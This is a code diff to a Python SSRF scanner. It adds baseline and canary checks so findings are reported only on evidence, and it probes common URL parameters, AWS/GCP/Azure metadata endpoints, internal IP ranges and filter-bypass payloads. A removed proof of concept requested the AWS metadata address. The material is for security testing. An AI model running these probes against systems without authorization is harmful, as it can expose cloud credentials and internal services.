@@ -15,9 +15,10 @@ import requests
 import time
 import json
 import socket
+import uuid
 import ipaddress
 from pathlib import Path
-from typing import List, Dict, Any
+from typing import List, Dict, Any, Optional
 from urllib.parse import urlparse
 import re
 
@@ -50,6 +51,19 @@ class SSRFScanner:
         }
 
         self.vulnerabilities: List[Dict[str, Any]] = []
+
+        # Unique canary the target echoes back only if it actually fetched our URL.
+        # Used to distinguish a real SSRF from a page that merely returns 200.
+        self.canary = uuid.uuid4().hex[:12]
+
+        # Baseline response (no payload) for differential comparison
+        self.baseline_text: Optional[str] = None
+        self.baseline_status: Optional[int] = None
+
+        # Candidate parameter names that commonly trigger server-side fetches
+        self.ssrf_params = ["url", "uri", "path", "dest", "redirect",
+                            "next", "target", "image", "img", "src",
+                            "callback", "webhook", "fetch", "load", "file"]
 
         # Cloud metadata endpoints
         self.cloud_metadata = {
@@ -120,14 +134,14 @@ class SSRFScanner:
 
     # ===================== TESTS =====================
 
-    def _make_request(self, payload_url: str):
+    def _make_request(self, payload_url: str, param: str = "url"):
         if self.request_count >= self.max_requests:
             return None
 
         try:
             response = requests.get(
                 self.target,
-                params={"url": payload_url},
+                params={param: payload_url},
                 headers=self.headers,
                 timeout=self.timeout,
                 verify=False,
@@ -138,31 +152,62 @@ class SSRFScanner:
         except Exception:
             return None
 
-    def _test_basic_ssrf(self):
-        test_url = "http://example.com"
+    def _capture_baseline(self):
+        """Fetch the target once with a harmless, NON-fetchable value so later
+        responses can be compared against it. Importantly the baseline value must
+        not itself cause the server to fetch our probe host (example.com) or the
+        probe markers would already be present in the baseline and detection
+        would be impossible. We use an opaque token."""
+        resp = self._make_request(f"revuex-baseline-{self.canary}")
+        if resp is not None:
+            self.baseline_text = resp.text
+            self.baseline_status = resp.status_code
 
-        vuln = {
+    def _looks_fetched(self, resp, markers: List[str]) -> bool:
+        """Return True only when the response contains evidence that the server
+        actually retrieved the injected URL (one of the content markers appears,
+        and it was not already present in the baseline)."""
+        if resp is None:
+            return False
+        body = resp.text or ""
+        baseline = self.baseline_text or ""
+        for m in markers:
+            if m in body and m not in baseline:
+                return True
+        return False
+
+    def _test_basic_ssrf(self):
+        """Confirm the parameter is actually fetched server-side by looking for
+        content from a URL we control, across common SSRF parameter names.
+        Only parameters that yield distinguishing evidence are reported."""
+        self._capture_baseline()
+
+        # example.com has a stable, recognisable title/body we can fingerprint.
+        markers = ["Example Domain", "illustrative examples in documents"]
+        confirmed_params = []
+
+        for param in self.ssrf_params:
+            if self.request_count >= self.max_requests:
+                break
+            resp = self._make_request("http://example.com/", param)
+            if self._looks_fetched(resp, markers):
+                confirmed_params.append(param)
+                print(f"   ✓ Parameter '{param}' appears to fetch remote content")
+            time.sleep(self.delay)
+
+        if not confirmed_params:
+            print("   ✓ No server-side fetch behaviour observed (no SSRF indicator)")
+            return
+
+        self.vulnerabilities.append({
             "type": "Server-Side Request Forgery (SSRF)",
             "severity": "high",
             "target": self.target,
-            "description": "Application makes server-side requests to attacker-controlled URLs",
-            "steps_to_reproduce": [
-                f"Navigate to: {self.target}",
-                "Identify URL parameter",
-                f"Submit payload: {test_url}",
-                "Observe outbound request",
-                "Escalate to internal or cloud metadata endpoints",
-            ],
-            "poc": (
-                "#!/usr/bin/env python3\n"
-                "import requests\n\n"
-                f"target = '{self.target}'\n\n"
-                "response = requests.get(target, params={'url': 'http://example.com'})\n"
-                "print(response.status_code)\n\n"
-                "response = requests.get(target, params={'url': 'http://169.254.169.254/latest/meta-data/'})\n"
-                "if 'ami-id' in response.text:\n"
-                "    print('CRITICAL: AWS metadata exposed')\n"
-            ),
+            "confirmed_parameters": confirmed_params,
+            "description": "Application fetched an attacker-supplied URL server-side; "
+                           "remote content was reflected in the response.",
+            "evidence": f"Content from example.com reflected via parameter(s): "
+                        f"{', '.join(confirmed_params)}",
             "remediation": [
                 "Whitelist allowed outbound domains",
                 "Block RFC1918 and link-local IP ranges",
@@ -170,104 +215,119 @@ class SSRFScanner:
                 "Apply egress firewall rules",
             ],
             "tags": ["ssrf", "high"],
-        }
-
-        self.vulnerabilities.append(vuln)
-        print("   ✓ Basic SSRF documented")
+        })
 
     def _test_cloud_metadata(self):
+        """Report metadata exposure only when the response actually contains
+        provider-specific metadata content."""
+        metadata_markers = {
+            "aws": ["ami-id", "instance-id", "security-credentials", "iam/"],
+            "gcp": ["computeMetadata", "numeric_project_id", "service-accounts"],
+            "azure": ["compute", "subscriptionId", "vmId"],
+        }
+
         for provider, endpoints in self.cloud_metadata.items():
             for endpoint in endpoints:
                 if self.request_count >= self.max_requests:
                     return
 
                 print(f"   Testing {provider.upper()}: {endpoint}")
+                resp = self._make_request(endpoint)
 
-                response = self._make_request(endpoint)
-
-                vuln = {
-                    "type": f"SSRF - Cloud Metadata ({provider.upper()})",
-                    "severity": "critical",
-                    "cloud_provider": provider,
-                    "endpoint": endpoint,
-                    "description": f"SSRF allows access to {provider.upper()} cloud metadata service",
-                    "poc": (
-                        "#!/usr/bin/env python3\n"
-                        "import requests\n\n"
-                        f"target = '{self.target}'\n"
-                        f"metadata = '{endpoint}'\n\n"
-                        "r = requests.get(target, params={'url': metadata})\n"
-                        "print(r.text)\n"
-                    ),
-                    "real_world": "Capital One breach via SSRF → AWS metadata → credential theft",
-                    "remediation": [
-                        "Block metadata IPs",
-                        "Use IMDSv2 (AWS)",
-                        "Rotate exposed credentials",
-                        "Enable cloud audit logging",
-                    ],
-                    "tags": ["ssrf", "cloud", provider, "critical"],
-                }
-
-                self.vulnerabilities.append(vuln)
+                if self._looks_fetched(resp, metadata_markers.get(provider, [])):
+                    self.vulnerabilities.append({
+                        "type": f"SSRF - Cloud Metadata ({provider.upper()})",
+                        "severity": "critical",
+                        "cloud_provider": provider,
+                        "endpoint": endpoint,
+                        "description": f"SSRF reached the {provider.upper()} metadata "
+                                       f"service and leaked metadata content.",
+                        "evidence": f"Metadata markers for {provider.upper()} "
+                                    f"observed in response to {endpoint}",
+                        "real_world": "Capital One breach via SSRF → AWS metadata → credential theft",
+                        "remediation": [
+                            "Block metadata IPs",
+                            "Use IMDSv2 (AWS)",
+                            "Rotate exposed credentials",
+                            "Enable cloud audit logging",
+                        ],
+                        "tags": ["ssrf", "cloud", provider, "critical"],
+                    })
+                    print(f"   ✓ VULNERABLE: {provider.upper()} metadata exposed")
                 time.sleep(self.delay)
 
         print("   ✓ Cloud metadata tests complete")
 
     def _test_internal_network(self):
+        """Internal-network reachability can only be inferred indirectly (timing /
+        differential responses). We flag a *candidate* only when the response to an
+        internal IP differs materially from the baseline, and we mark it as
+        requiring manual confirmation rather than asserting a confirmed breach."""
         for ip in self.internal_ips:
             if self.request_count >= self.max_requests:
                 return
 
             print(f"   Testing internal IP: {ip}")
+            resp = self._make_request(f"http://{ip}/")
+            if resp is None:
+                continue
 
-            vuln = {
-                "type": "SSRF - Internal Network Access",
-                "severity": "high",
-                "internal_ip": ip,
-                "description": "SSRF allows access to internal network resources",
-                "poc": (
-                    "#!/usr/bin/env python3\n"
-                    "import requests\n\n"
-                    f"target = '{self.target}'\n"
-                    f"requests.get(target, params={{'url': 'http://{ip}'}})\n"
-                ),
-                "remediation": [
-                    "Block RFC1918 ranges",
-                    "Enforce network segmentation",
-                    "Restrict backend egress traffic",
-                ],
-                "tags": ["ssrf", "internal"],
-            }
+            baseline = self.baseline_text or ""
+            differs = (
+                self.baseline_status is not None
+                and resp.status_code != self.baseline_status
+            ) or (abs(len(resp.text) - len(baseline)) > 200)
 
-            self.vulnerabilities.append(vuln)
-            self.request_count += 1
+            if differs:
+                self.vulnerabilities.append({
+                    "type": "SSRF - Possible Internal Network Access",
+                    "severity": "medium",
+                    "confidence": "needs-manual-verification",
+                    "internal_ip": ip,
+                    "description": "Response to an internal IP differed from the baseline, "
+                                   "which may indicate the server reached an internal host. "
+                                   "Confirm manually (timing / error content).",
+                    "evidence": f"status={resp.status_code} (baseline={self.baseline_status}), "
+                                f"len={len(resp.text)} vs baseline {len(baseline)}",
+                    "remediation": [
+                        "Block RFC1918 ranges",
+                        "Enforce network segmentation",
+                        "Restrict backend egress traffic",
+                    ],
+                    "tags": ["ssrf", "internal", "unconfirmed"],
+                })
+                print(f"   ? Candidate: response for {ip} differs from baseline")
             time.sleep(self.delay)
 
         print("   ✓ Internal network tests complete")
 
     def _test_url_bypasses(self):
+        """Filter-bypass payloads are only interesting if they produce evidence of
+        a fetch that the plain payload did not. Report a bypass only when a known
+        marker is reflected."""
+        markers = ["Example Domain", "ami-id", "instance-id", "computeMetadata"]
         for payload, technique in self.bypass_payloads:
             if self.request_count >= self.max_requests:
                 return
 
             print(f"   Testing bypass: {technique}")
-
-            vuln = {
-                "type": f"SSRF - Bypass ({technique})",
-                "severity": "high",
-                "payload": payload,
-                "description": f"SSRF filter bypass using {technique}",
-                "remediation": [
-                    "Resolve and validate final IP address",
-                    "Block IP encoding variations",
-                    "Use strict URL parsers",
-                ],
-                "tags": ["ssrf", "bypass"],
-            }
-
-            self.vulnerabilities.append(vuln)
-            self.request_count += 1
+            resp = self._make_request(payload)
+            if self._looks_fetched(resp, markers):
+                self.vulnerabilities.append({
+                    "type": f"SSRF - Filter Bypass ({technique})",
+                    "severity": "high",
+                    "payload": payload,
+                    "description": f"SSRF filter bypassed using {technique}; "
+                                   f"remote/internal content was fetched.",
+                    "evidence": f"Fetch marker reflected for payload {payload}",
+                    "remediation": [
+                        "Resolve and validate final IP address",
+                        "Block IP encoding variations",
+                        "Use strict URL parsers",
+                    ],
+                    "tags": ["ssrf", "bypass"],
+                })
+                print(f"   ✓ VULNERABLE: bypass works ({technique})")
             time.sleep(self.delay)
 
         print("   ✓ URL bypass tests complete")
